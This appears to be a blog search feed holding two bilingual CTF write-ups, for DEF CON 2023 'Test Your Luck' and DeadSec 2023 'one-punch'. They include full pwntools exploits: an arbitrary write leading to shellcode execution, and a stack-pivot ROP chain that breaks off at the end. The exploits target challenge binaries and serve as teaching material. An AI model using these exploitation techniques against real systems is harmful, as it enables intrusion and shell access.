<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)</title>
      <link href="/230601-defcon2023-test-your-luck/"/>
      <url>/230601-defcon2023-test-your-luck/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1871">https://ctftime.org/event/1871</a></li></ul><blockquote><p>Can you beat the hottest new skill-based game sweeping the nation? Is guessing 32 bits really possible within the span of the CTF?</p></blockquote><ul><li>[30 solves]</li></ul><p>very fun challenge XD</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>IDA로 봤을 때보다 더 많은 로직이 있는 것 같았다. 그래서 나는 주로 GDB를 이용하여 분석했다. IDA에서 암호화된 함수를 찾을 수 있었다.</p><p>It seems to have a bit more logic than the function seen with IDA. So I usually analyzed with GDB. I could find encrypted function in IDA.</p><img src="/images/230601-defcon2023-test-your-luck/1.png" width=550/><br><p>위 함수가 동적 디버깅할 때는 잘 해석이 되어서 바이트를 추출해서 패치를 해주기로 하였다.</p><p>The above function was interpreted well during dynamic debugging, so I decided to extract the bytes and patch them.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/20i 0x555555556000</span><br><span class="line">   0x555555556000:      endbr64</span><br><span class="line">   0x555555556004:      push   r12</span><br><span class="line">   0x555555556006:      xor    r9d,r9d</span><br><span class="line">   0x555555556009:      xor    r8d,r8d</span><br><span class="line">   0x55555555600c:      mov    ecx,0x8</span><br><span class="line">   0x555555556011:      push   rbp</span><br><span class="line">   0x555555556012:      mov    esi,0x1</span><br><span class="line">   0x555555556017:      mov    edi,0x1</span><br><span class="line">   0x55555555601c:      push   rbx</span><br><span class="line">   0x55555555601d:      sub    rsp,0x20</span><br><span class="line">   0x555555556021:      mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x55555555602a:      mov    QWORD PTR [rsp+0x18],rax</span><br><span class="line">   0x55555555602f:      lea    rax,[rip+0xffffffffffffdfca]        # 0x555555554000</span><br><span class="line">   0x555555556036:      lea    rdx,[rsp+0x8]</span><br><span class="line">   0x55555555603b:      lea    rbp,[rsp+0x10]</span><br><span class="line">   0x555555556040:      mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x555555556045:      call   0x5555555552e9 &lt;syscall&gt;</span><br><span class="line">   0x55555555604a:      lea    r12,[rip+0x22ef]        # 0x555555558340</span><br><span class="line">   0x555555556051:      jmp    0x5555555560a9</span><br><span class="line">   0x555555556053:      nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">...</span><br><span class="line">   0x555555556145:      sub    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x55555555614e:      jne    0x555555556159</span><br><span class="line">   0x555555556150:      add    rsp,0x20</span><br><span class="line">   0x555555556154:      pop    rbx</span><br><span class="line">   0x555555556155:      pop    rbp</span><br><span class="line">   0x555555556156:      pop    r12</span><br><span class="line">   0x555555556158:      ret</span><br><span class="line">   0x555555556159:      call   0x555555555030 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x55555555615e:      add    BYTE PTR [rax],al</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p/x 0x55555555615e - 0x555555556000</span><br><span class="line">$3 = 0x15e</span><br><span class="line">gef&gt; print-format --length 0x15e --bitlen 8 --lang py 0x555555556000</span><br><span class="line">buf = [0xf3, 0xf, ... ]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">buf = [<span class="number">0xf3</span>, <span class="number">0xf</span>, <span class="number">0x1e</span>, <span class="number">0xfa</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x53</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x5</span>, <span class="number">0xca</span>, <span class="number">0xdf</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0xe8</span>, <span class="number">0x9f</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x4c</span>, <span class="number">0x8d</span>, <span class="number">0x25</span>, <span class="number">0xef</span>, <span class="number">0x22</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xeb</span>, <span class="number">0x56</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xe3</span>, <span class="number">0x72</span>, <span class="number">0xd</span>, <span class="number">0x48</span>, <span class="number">0x3b</span>, <span class="number">0x1d</span>, <span class="number">0x12</span>, <span class="number">0x25</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x86</span>, <span class="number">0x9c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0xf</span>, <span class="number">0x84</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x4c</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x7e</span>, <span class="number">0x4f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x3</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x20</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x7f</span>, <span class="number">0x8b</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x3</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xe9</span>, <span class="number">0x6d</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0xe0</span>, <span class="number">0xf1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xeb</span>, <span class="number">0x96</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0xc0</span>, <span class="number">0xf1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0xf</span>, <span class="number">0x85</span>, <span class="number">0x46</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x66</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x84</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x2b</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x75</span>, <span class="number">0x9</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>, <span class="number">0x5b</span>, <span class="number">0x5d</span>, <span class="number">0x41</span>, <span class="number">0x5c</span>, <span class="number">0xc3</span>, <span class="number">0xe8</span>, <span class="number">0xd2</span>, <span class="number">0xee</span>, <span class="number">0xff</span>, <span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(buf)):</span><br><span class="line">    addr = <span class="number">0x2000</span> + i</span><br><span class="line">    byte = buf[i]</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&#x27;patch_byte(&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(addr))+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))+<span class="string">&#x27;);&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(cmd) </span><br></pre></td></tr></table></figure><p>위 파이썬 스크립트를 실행해서 나온 결과를 IDA에서 스크립트로 실행하면 된다. 이때 중요한 점은 IDA에 반영하고 ‘reanalyze program’ 한 후 껐다 켜야 디컴파일이 되는데 끌 때 ‘DON’T SAVE the database’을 체크해야 한다.</p><p>You can execute the result of executing the above python script as a script in IDA. At this time, the important point is to reflect in IDA, ‘reanalyze program’, and guit IDA. When quiting it, You have to check ‘DON’T SAVE the database’. Now, you can see decompiled source code.</p><img src="/images/230601-defcon2023-test-your-luck/2.png" width=550/><br><img src="/images/230601-defcon2023-test-your-luck/3.png" width=550/><br><p>사실 나는 함수를 디코드 하기 전에 디버깅하면서 임의쓰기를 발견했다. while문을 이용해서 원하는 만큼 임의 쓰기가 가능하다. syscall을 이용해서 buf에 8바이트 입력을 받는데, 특정 주소를 거르고 있다. 이는 got 영역을 포함한다. 반복문을 끝내고 싶으면 0을 입력하면 된다. 30번째 라인에서 원하는 주소에 원하는 값을 쓰는 것을 확인할 수 있다.</p><p>Actually I found arbitrary writes before decoding the function. It is possible to write arbitrarily as many times as desired by using a while statement. The buf is received 8 bytes input by using a syscall. It’s filtering out a specific address including got space. If you want to end the loop, you can send 0. In the 30th line, you can find exactly arbitrary writes.</p><img src="/images/230601-defcon2023-test-your-luck/6.png" width=550/><br><p>sub_2000 함수를 xref로 확인해보면 sub_2000 함수를 decode 해주는 함수를 찾을 수 있다. 그 함수에서 sub_2000을 decode 한 후, 특정한 프로그램 영역을 rwx로 권한을 바꿔주는 함수를 호출한다. 이 함수를 mprotect_rwx() 함수로 네이밍해주었다. 이 문제는 NX_bit 보호기법이 없어서 이 함수를 활용하면 좋겠다는 생각을 했다.  </p><p>If you check the sub_2000 function by xref, you can find a function that decodes the sub_2000 function. After decode sub_2000 in that function, call a function that changes the authority of a specific program area to rwx. I named this function mprotect_rwx() function. Since there is no NX bit mitigation for this challenge, I thought it would be nice to use this function.</p><p>sub_2000 함수를 호출한 후 아래와 같은 로직의 generate_random() 함수를 호출한다. 사실상 완전한 random이 아니기 때문에 예측가능하다. </p><p>The generated_random() function is called after the sub_2000 function is called. The random_value isn’t definitly random. So It could be predictable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword_45B0 = dword_45B8 + dword_45B0 * dword_45B4;<span class="comment">// random_value 예측 가능</span></span><br><span class="line">random_value = dword_45B0;</span><br></pre></td></tr></table></figure><p>우리에겐 임의 쓰기가 있기 때문에 random_value를 예측할 수 있다. 이 함수가 종료되면 드디어 main 함수가 호출되는데, random_value는 main 함수에서 사용된다. random_value를 예측하면 Correct!을 출력하고 틀리면 Incorrect를 출력해준다. main 함수에서는 별다른 취약점이 보이지 않았다.</p><p>Because we have arbitrary writes, you can predict random_value. When this function ends, the main function is finally called, and random_value is used in the main function. If random_value is predicted, ‘Correct!’ is output, otherwise ‘Incorrect’ is output. I couldn’t find any vulnerabilities in the main function.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>처음에 pie 주소가 출력되어서 이것부터 릭해주었다. </p><p>At first, the pie address was printed, So I leaked it.</p><p>전략은 다음과 같다. 쉘코드 실행이 가능하기 때문에 쉘코드 실행을 목표로 삼았다. 그리고 임의 쓰기를 이용하여 w 권한이 주어진 곳에 쉘코드를 쓰기로 했다. 스택 주소를 알기가 힘들기 때문에 지금 현재 알고 있는 pie 주소를 최대한 활용하고자 했다. </p><p>The strategy is this. Because shellcode execution is possible, I targeted shellcode execution. And I decide to write shellcode at area with w authority by using arbitrary writes. It was difficult to know stack address, So I wanted to make the most of the pie address I currently know.</p><img src="/images/230601-defcon2023-test-your-luck/4.png" width=600/><br><p>mprotect_rwx() 함수가 호출되면 위와 같이 저 영역이 rwx로 변하기 때문에 적당하다고 생각했다. 이를 위해 generate_random() 함수 대신 mprotect_rwx() 함수가 실행되도록 하기로 결심했다. 마지막으로 fini_array를 이용해서 sub_2000가 한 번 더 실행되게 했다.</p><p>When mprotect_rwx() function was called, the above area was changed to rwx autority. So I thought this area was suitable for writing shellcode. For this, I decided to have the mprotect_rwx() function call instead of the generate_random() function. Finally sub_2000 function is called one more time by using fini_array.</p><p>sub_2000가 한 번 더 실행되고, 이제 rwx 권한이 주어진 프로그램 영역에 임의 쓰기가 가능하다. sub_2000 함수에서 임의쓰기가 끝난 후 종료되는 아래 영역이 쉘코드를 작성하기에 가장 적당하다고 판단했다.  </p><p>The sub_2000 is called one more, and now arbitrary writes are possible to the program area given the rwx permission. In the sub_2000 function, it was determined that the area below, which ends after arbitrary writing is finished, is the most suitable for writing shellcode.</p><img src="/images/230601-defcon2023-test-your-luck/5.png" width=550/><br><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = os.environ.get(<span class="string">&#x27;HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">p = remote(HOST, <span class="built_in">int</span>(PORT))</span><br><span class="line"><span class="comment"># p = process(&#x27;./../handout/challenge&#x27;)</span></span><br><span class="line"></span><br><span class="line">pie_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># info(hex(pie_base))</span></span><br><span class="line"></span><br><span class="line">fini_array = pie_base + <span class="number">0x4338</span></span><br><span class="line"></span><br><span class="line">p.send(p64(pie_base + <span class="number">0x4330</span>)) <span class="comment"># generate_random</span></span><br><span class="line">p.send(p64(pie_base + <span class="number">0x1370</span>)) <span class="comment"># mprotect_rwx</span></span><br><span class="line"></span><br><span class="line">p.send(p64(fini_array)) </span><br><span class="line">p.send(p64(pie_base + <span class="number">0x2000</span>)) <span class="comment"># one more</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit sub_2000</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># for main</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; one more sub_2000 &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_addr = pie_base + <span class="number">0x2140</span> </span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(hex(len(shellcode))) # 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p.send(p64(shellcode_addr + i*<span class="number">8</span>))</span><br><span class="line">    p.send(shellcode[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit sub_2000</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;./submitter&#x27;</span>)</span><br><span class="line"><span class="comment"># flag = p.recvline_contains(b&#x27;LiveCTF&#123;&#x27;).decode().strip()</span></span><br><span class="line"><span class="comment"># log.info(&#x27;Flag: %s&#x27;, flag)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Defcon </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DeadSec CTF 2023 - one-punch (stack pivoting)</title>
      <link href="/230524-deadsecctf2023-one_punch/"/>
      <url>/230524-deadsecctf2023-one_punch/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1962">https://ctftime.org/event/1962</a></li></ul><blockquote><p>100 BOFs, 100 UAFs, 100 Race cons and a 10 km ROP chain, EVERY SINGLE DAY!!!<br>netcat.deadsec.quest 31794<br>Author: Goldenboy</p></blockquote><ul><li>[39 solves &#x2F; 241 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> garou[<span class="number">100</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(key, mapped_region) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Two punch man? lameeeeee&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">420</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(mapped_region, <span class="number">0</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">  mprotect(mapped_region, <span class="number">0x1000</span>uLL, <span class="number">1</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(garou);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main으로 다시 돌아오는 것이 힘들어보여 bss영역에 페이로드를 입력받아 이를 활용하기로 했다. bof가 <code>gets</code> 함수를 통해 터져주니 입력 사이즈 제한도 없어서 좋다. </p><p>bss 영역에 <code>system</code> 함수를 실행시키기 위한 rop payload를 저장시킬 때 중요한 점은 <code>system</code> 함수는 스택을 많이 사용하니 넉넉한 공간에 넣어줘야한다는 것이다. 그래서 <code>bss + 0x700</code>에 rop payload를 입력 받고 rbp로 설정하였다.</p><p>참고로 문제를 풀면서 <code>system</code> 함수를 실행할 때 <code>xmm</code> 레지스터 관련한 에러가 발생했는데, 이는 stack align이 안맞아서 발생하는 것이다. rbp는 항상 16의 배수여야 한다. </p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./one_punchp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;netcat.deadsec.quest&#x27;</span>, <span class="number">31794</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./one_punchp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x1291</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">mapped_region = e.address + <span class="number">0x4050</span></span><br><span class="line">pop_rdi = e.address + <span class="number">0x1291</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line">leave_ret = e.address + <span class="number">0x132f</span></span><br><span class="line">info(<span class="built_in">hex</span>(mapped_region))</span><br><span class="line"></span><br><span class="line">bss = e.bss()</span><br><span class="line">info(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(bss + <span class="number">0x700</span>) <span class="comment"># for stack pivoting</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss + <span class="number">0x700</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span 